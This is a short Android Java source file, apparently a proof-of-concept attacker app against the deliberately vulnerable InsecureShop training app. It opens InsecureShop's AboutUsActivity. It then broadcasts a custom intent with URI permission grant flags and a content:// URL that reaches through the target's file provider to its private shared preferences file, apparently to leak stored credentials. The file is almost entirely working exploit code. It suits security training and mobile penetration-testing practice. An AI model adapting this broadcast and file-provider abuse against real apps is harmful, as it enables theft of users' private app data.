package com.example.myapplication;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent intent = new Intent();
        intent.setClassName("com.insecureshop","com.insecureshop.AboutUsActivity");
        startActivity(intent);

        new Handler().postDelayed(()->sendDelayBroadcast(),1200);

    }
    public void sendDelayBroadcast(){
        Intent broadcast = new Intent("com.insecureshop.CUSTOM_INTENT");
        broadcast.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        broadcast.putExtra("web_url","content://com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml");
        sendBroadcast(broadcast);
    }
}